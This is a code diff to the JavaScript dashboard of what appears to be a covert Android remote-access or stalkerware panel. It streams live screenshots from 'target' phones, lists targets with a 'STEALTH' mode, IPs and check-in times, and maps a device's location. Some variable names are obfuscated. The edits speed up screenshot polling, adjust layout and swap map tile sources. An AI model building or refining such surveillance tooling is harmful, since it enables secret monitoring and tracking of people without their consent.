@@ -720,12 +720,12 @@ function enforceGhostViewportScaling() {
   const streamImg = document.getElementById("ghost-screen-stream");
   if (streamImg) {
     streamImg.style.width = "100%";
-    streamImg.style.maxWidth = "360px";
-    streamImg.style.height = "auto";
-    streamImg.style.maxHeight = "70vh";
-    streamImg.style.objectFit = "contain";
+    streamImg.style.height = "100%";
+    streamImg.style.maxWidth = "100%";
+    streamImg.style.maxHeight = "100%";
+    streamImg.style.objectFit = "fill";
     streamImg.style.display = "block";
-    streamImg.style.margin = "0 auto";
+    streamImg.style.margin = "0";
     streamImg.style.borderRadius = "12px";
     streamImg.style.touchAction = "none";
     streamImg.style.webkitUserSelect = "none";
@@ -733,9 +733,12 @@ function enforceGhostViewportScaling() {
 
     const parent = streamImg.parentElement;
     if (parent) {
+      parent.style.width = "320px";
+      parent.style.height = "600px";
       parent.style.maxWidth = "100%";
       parent.style.boxSizing = "border-box";
       parent.style.overflow = "hidden";
+      parent.style.position = "relative";
       parent.style.touchAction = "none";
     }
 
@@ -800,24 +803,31 @@ function toggleGhostScreen() {
   }
 }
 
+let isGhostFetching = false;
+
 function refreshGhostScreen() {
-  if (_0x2a) {
-    const streamImg = document.getElementById("ghost-screen-stream");
-    const statusCard = document.getElementById("ghost-screen-status");
-    enforceGhostViewportScaling();
-    const img = new Image();
-    img.src = "/ghost/screenshot?t=" + Date.now();
-    img.onload = () => {
-      if (_0x2a && streamImg) {
-        streamImg.src = img.src;
-        if (statusCard) statusCard.style.display = "none";
-        setTimeout(refreshGhostScreen, _0x2b ? 2000 : 30);
-      }
-    };
-    img.onerror = () => {
-      if (_0x2a) setTimeout(refreshGhostScreen, 80);
-    };
-  }
+  if (!_0x2a || isGhostFetching) return;
+  isGhostFetching = true;
+
+  const streamImg = document.getElementById("ghost-screen-stream");
+  const statusCard = document.getElementById("ghost-screen-status");
+  enforceGhostViewportScaling();
+  const img = new Image();
+  img.src = "/ghost/screenshot?t=" + Date.now() + "&r=" + Math.random();
+  img.onload = () => {
+    isGhostFetching = false;
+    if (_0x2a && streamImg) {
+      streamImg.src = img.src;
+      if (statusCard) statusCard.style.display = "none";
+      setTimeout(refreshGhostScreen, 10);
+    }
+  };
+  img.onerror = () => {
+    isGhostFetching = false;
+    if (_0x2a) {
+      setTimeout(refreshGhostScreen, 50);
+    }
+  };
 }
 
 window.isGhostControlLocked = false;
@@ -1164,12 +1174,17 @@ async function refreshTargetsTable() {
         ? '<span style="color:var(--neon-yellow); font-weight:bold;">STEALTH</span>'
         : '<span style="color:var(--neon-green); font-weight:bold;">NORMAL</span>';
 
+      let rawEndpoint = target.endpointIp || target.ip || '127.0.0.1:9191';
+      let formattedEndpoint = rawEndpoint.includes(':') && !rawEndpoint.startsWith('127.') && !rawEndpoint.includes('[')
+        ? `<span style="word-break: break-all; white-space: normal; display: inline-block; max-width: 160px; font-size: 0.65rem; line-height: 1.2;">${rawEndpoint}</span>`
+        : rawEndpoint;
+
       let row = `<tr style="background: rgba(255,255,255,0.02); border-radius: 6px;">
         <td style="padding: 10px; color: var(--neon-cyan); font-weight: bold;">&#9999;&#65039; ${target.deviceId || 'samsung'}</td>
         <td style="padding: 10px; color: #fff;">${target.model || 'SM-F731W'}</td>
         <td style="padding: 10px; color: #ccc;">${target.osVersion || target.os || 'Android 16'}</td>
         <td style="padding: 10px; color: #fff;">${target.battery || '100%'}</td>
-        <td style="padding: 10px; color: var(--neon-green); font-family: monospace; word-break: break-all; max-width: 170px;">${target.endpointIp || target.ip || '127.0.0.1:9191'}</td>
+        <td style="padding: 10px; color: var(--neon-green); font-family: monospace; white-space: normal !important; word-break: break-all !important; max-width: 160px; min-width: 120px;">${formattedEndpoint}</td>
         <td style="padding: 10px;">${statusBadge}</td>
         <td style="padding: 10px;">${profileBadge}</td>
         <td style="padding: 10px; color: #aaa;">${target.lastCheckIn || target.lastSeen || new Date().toLocaleString()}</td>
@@ -1553,7 +1568,7 @@ function locateDevice() {
         const extMapBtn = document.getElementById("ext-map-btn");
 
         if (mapFrame) {
-          mapFrame.srcdoc = `<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><style>html,body,#map{height:100%;margin:0;padding:0;background:#000;}.leaflet-tile-pane{filter:invert(90%) hue-rotate(180deg);}.red-pin{background-color:#ff0033;width:16px;height:16px;border-radius:50%;border:2px solid #ffffff;box-shadow:0 0 12px #ff0033, 0 0 24px #ff0033;animation:pulse 1.5s infinite;margin-left:-8px;margin-top:-8px;}@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,0,51,0.8);}70%{box-shadow:0 0 0 15px rgba(255,0,51,0);}100%{box-shadow:0 0 0 0 rgba(255,0,51,0);}}</style></head><body><div id="map"></div><script>var m=L.map('map',{zoomControl:false}).setView([${data.lat},${data.lon}],15);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);var redIcon=L.divIcon({className:'custom-red-pin',html:'<div class="red-pin"></div>'});L.marker([${data.lat},${data.lon}],{icon:redIcon}).addTo(m);</script></body></html>`;
+          mapFrame.srcdoc = `<!DOCTYPE html><html><head><meta name="referrer" content="no-referrer"/><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><style>html,body,#map{height:100%;margin:0;padding:0;background:#02080d;}.red-pin{background-color:#ff0033;width:16px;height:16px;border-radius:50%;border:2px solid #ffffff;box-shadow:0 0 12px #ff0033, 0 0 24px #ff0033;animation:pulse 1.5s infinite;margin-left:-8px;margin-top:-8px;}@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,0,51,0.8);}70%{box-shadow:0 0 0 15px rgba(255,0,51,0);}100%{box-shadow:0 0 0 0 rgba(255,0,51,0);}}</style></head><body><div id="map"></div><script>var m=L.map('map',{zoomControl:false}).setView([${data.lat},${data.lon}],15);var tile1=L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{maxZoom:19,subdomains:'abcd'});tile1.on('tileerror',function(){L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}').addTo(m);});tile1.addTo(m);var redIcon=L.divIcon({className:'custom-red-pin',html:'<div class="red-pin"></div>'});L.marker([${data.lat},${data.lon}],{icon:redIcon}).addTo(m);</script></body></html>`;
           mapFrame.style.display = "block";
         }
         if (mapOverlay) mapOverlay.style.display = "none";
